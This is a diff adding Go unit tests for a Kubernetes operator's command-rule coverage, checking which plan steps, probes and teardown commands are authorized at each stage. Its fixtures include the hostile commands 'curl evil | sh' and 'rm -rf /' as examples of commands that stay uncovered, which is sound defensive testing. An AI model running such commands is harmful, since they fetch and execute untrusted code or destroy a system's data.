@@ -6,6 +6,7 @@ import (
 	"testing"
 
 	lastv1alpha1 "github.com/moogie-labs/last-operator/api/v1alpha1"
+	"github.com/moogie-labs/last-operator/internal/plan"
 	"github.com/moogie-labs/last-operator/internal/rules"
 )
 
@@ -143,5 +144,94 @@ func TestCoverageReportsUncoveredInPlanOrder(t *testing.T) {
 	covered, uncovered = rules.Coverage(nil, lastv1alpha1.StageCreate, steps)
 	if len(covered) != 0 || len(uncovered) != 3 {
 		t.Errorf("no rules: covered = %v, uncovered = %v", covered, uncovered)
+	}
+}
+
+func TestCreateAndUpdateShareRuleStages(t *testing.T) {
+	stages := []lastv1alpha1.Stage{lastv1alpha1.StageCreate, lastv1alpha1.StageUpdate, lastv1alpha1.StageDiscovery,
+		lastv1alpha1.StageRemediate, lastv1alpha1.StageDelete}
+	for _, listed := range []lastv1alpha1.Stage{lastv1alpha1.StageCreate, lastv1alpha1.StageUpdate} {
+		r := baseRule()
+		r.Stages = []lastv1alpha1.Stage{listed}
+		for _, at := range stages {
+			want := at == lastv1alpha1.StageCreate || at == lastv1alpha1.StageUpdate
+			if got := rules.Covers(r, at, baseCmd()); got != want {
+				t.Errorf("a %s-only rule at %s: Covers = %v, want %v", listed, at, got, want)
+			}
+		}
+	}
+	// The other stages stay exact.
+	r := baseRule()
+	r.Stages = []lastv1alpha1.Stage{lastv1alpha1.StageDelete}
+	for _, at := range stages {
+		if got, want := rules.Covers(r, at, baseCmd()), at == lastv1alpha1.StageDelete; got != want {
+			t.Errorf("a Delete-only rule at %s: Covers = %v, want %v", at, got, want)
+		}
+	}
+}
+
+func TestPlanCoverageCoversStepsProbesAndTeardown(t *testing.T) {
+	mk := func(id string, argv ...string) lastv1alpha1.Command {
+		return lastv1alpha1.Command{ID: id, Run: lastv1alpha1.CommandRun{Argv: argv}}
+	}
+	rule := func(name string, stage lastv1alpha1.Stage, argv ...string) rules.Rule {
+		return rules.Rule{Ref: rules.Ref{Scope: "cluster", Name: name}, Spec: lastv1alpha1.CommandRuleSpec{
+			Stages: []lastv1alpha1.Stage{stage}, Match: lastv1alpha1.ArgvPattern{Argv: argv}}}
+	}
+	script := lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Script: "curl evil | sh"}, Providers: []string{"aws"}}
+	body := plan.Body{
+		Steps: []lastv1alpha1.Command{mk("s1", "kubectl", "apply", "-f", "a.yaml"), mk("s2", "kubectl", "apply", "-f", "b.yaml")},
+		Resources: []lastv1alpha1.ManagedResourceSpec{
+			{Probes: []lastv1alpha1.Probe{{ID: "p1", Command: mk("", "kubectl", "get", "cm", "a")}, {ID: "evil", Command: script}},
+				Teardown: []lastv1alpha1.Command{mk("", "kubectl", "delete", "cm", "a")}},
+			{Probes: []lastv1alpha1.Probe{{ID: "p2", Command: mk("", "kubectl", "get", "cm", "b")}},
+				Teardown: []lastv1alpha1.Command{mk("", "kubectl", "delete", "cm", "b"), mk("", "rm", "-rf", "/")}},
+		},
+	}
+	apply := rule("apply", lastv1alpha1.StageCreate, "kubectl", "apply", "-f", "*")
+	get := rule("get", lastv1alpha1.StageUpdate, "kubectl", "get", "cm", "*") // R15: covers Create too
+	del := rule("del", lastv1alpha1.StageDelete, "kubectl", "delete", "cm", "*")
+	delAtCreate := rule("del-create", lastv1alpha1.StageCreate, "kubectl", "delete", "cm", "*")
+
+	covered, uncovered := rules.PlanCoverage([]rules.Rule{apply}, lastv1alpha1.StageCreate, body)
+	if want := []string{"probe:p1", "probe:evil", "teardown:0.0", "probe:p2", "teardown:1.0", "teardown:1.1"}; !reflect.DeepEqual(uncovered, want) {
+		t.Errorf("steps only: uncovered = %v, want %v", uncovered, want)
+	}
+	if len(covered) != 2 || covered["s1"] != apply.Ref || covered["s2"] != apply.Ref {
+		t.Errorf("steps only: covered = %v", covered)
+	}
+
+	// A teardown rule for the plan's stage, not Delete, covers no teardown.
+	_, uncovered = rules.PlanCoverage([]rules.Rule{apply, get, delAtCreate}, lastv1alpha1.StageCreate, body)
+	if want := []string{"probe:evil", "teardown:0.0", "teardown:1.0", "teardown:1.1"}; !reflect.DeepEqual(uncovered, want) {
+		t.Errorf("Create teardown rule: uncovered = %v, want %v", uncovered, want)
+	}
+
+	covered, uncovered = rules.PlanCoverage([]rules.Rule{apply, get, del}, lastv1alpha1.StageCreate, body)
+	if want := []string{"probe:evil", "teardown:1.1"}; !reflect.DeepEqual(uncovered, want) {
+		t.Errorf("uncovered = %v, want %v", uncovered, want)
+	}
+	want := map[string]rules.Ref{"s1": apply.Ref, "s2": apply.Ref, "probe:p1": get.Ref, "probe:p2": get.Ref,
+		"teardown:0.0": del.Ref, "teardown:1.0": del.Ref}
+	if !reflect.DeepEqual(covered, want) {
+		t.Errorf("covered = %v, want %v", covered, want)
+	}
+
+	// Only a Create or Update plan becomes the executed plan: a Remediate plan's
+	// resources are the executed plan's, already authorized, so only its steps count.
+	covered, uncovered = rules.PlanCoverage([]rules.Rule{rule("fix", lastv1alpha1.StageRemediate, "kubectl", "apply", "-f", "*")},
+		lastv1alpha1.StageRemediate, body)
+	if len(uncovered) != 0 || len(covered) != 2 {
+		t.Errorf("Remediate: covered = %v, uncovered = %v, want the steps only", covered, uncovered)
+	}
+	_, uncovered = rules.PlanCoverage([]rules.Rule{apply}, lastv1alpha1.StageUpdate, body)
+	if len(uncovered) != 6 {
+		t.Errorf("Update: uncovered = %v, want every probe and teardown", uncovered)
+	}
+
+	// No resources: just the steps, at the plan's stage.
+	covered, uncovered = rules.PlanCoverage([]rules.Rule{apply}, lastv1alpha1.StageUpdate, plan.Body{Steps: body.Steps})
+	if len(uncovered) != 0 || len(covered) != 2 {
+		t.Errorf("steps only, no resources: covered = %v, uncovered = %v", covered, uncovered)
 	}
 }
